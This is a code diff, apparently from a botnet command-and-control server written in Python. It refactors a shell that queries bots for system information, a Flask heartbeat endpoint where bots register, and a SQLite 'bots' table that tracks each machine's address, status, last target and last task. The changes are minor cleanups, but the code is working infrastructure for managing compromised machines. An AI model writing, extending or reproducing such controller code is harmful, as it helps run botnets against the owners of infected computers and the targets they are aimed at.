@@ -67,10 +67,10 @@ class CommandShell(cmd.Cmd):
                 result = requests.get(f"http://{client['ip_address']}:{client['listening_port']}/systeminfo", timeout=5).json()
                 print(f"[{result['mac-address']}]\n\tHostname: {result['hostname']}\n\tListening Address: http://{client['ip_address']}:{client['listening_port']}\n\tPlatform: {result['platform']} {result['platform-release']} {result['platform-version']}\n\tArchitecture: {result['architecture']}\n\tProcessor: {result['processor']}\n\tRAM: {result['ram']}")
                 db.updateLastTask("systeminfo", None, client['mac_address'], BotStatus.ONLINE)
-            except ConnectionError as e:
+            except ConnectionError:
                 print(f"{client['mac_address']} is offline.")
                 db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.OFFLINE)
-            except Exception as e:
+            except Exception:
                 db.updateLastTask("failed_systeminfo", None, client['mac_address'], BotStatus.ONLINE)
 
         args = split_string(args)
@@ -148,11 +148,11 @@ class FlaskServer:
         ipaddr = request.remote_addr
         port = json['running-port']
         startingup = bool(json['starting-up'])
-        status = "online"
+        status = BotStatus.ONLINE
         if not startingup:
             res = db.getSingleBot(macaddress)
             if res:
-                status = "running" if res['status'] == "running" else "online"
+                status = BotStatus.RUNNING if res['status'] == BotStatus.RUNNING else BotStatus.ONLINE
 
         db.execute("INSERT INTO bots (mac_address, ip_address, listening_port, status) VALUES (?, ?, ?, ?) ON CONFLICT(mac_address) DO UPDATE SET ip_address = excluded.ip_address, listening_port = excluded.listening_port, status = excluded.status, last_heartbeat = CURRENT_TIMESTAMP", macaddress, ipaddr, port, status)
         return "", 200
@@ -165,12 +165,12 @@ class DB:
         self.con.row_factory = sqlite3.Row
         cur = self.con.cursor()
         cur.execute("PRAGMA foreign_keys = ON;")
-        cur.execute('''
+        cur.execute(f'''
             CREATE TABLE IF NOT EXISTS bots (
             mac_address TEXT NOT NULL PRIMARY KEY,
             ip_address TEXT NOT NULL,
             listening_port INTEGER NOT NULL,
-            status text "online",
+            status text "{BotStatus.ONLINE}",
             last_heartbeat DATETIME DEFAULT CURRENT_TIMESTAMP,
             last_target TEXT,
             last_task TEXT,
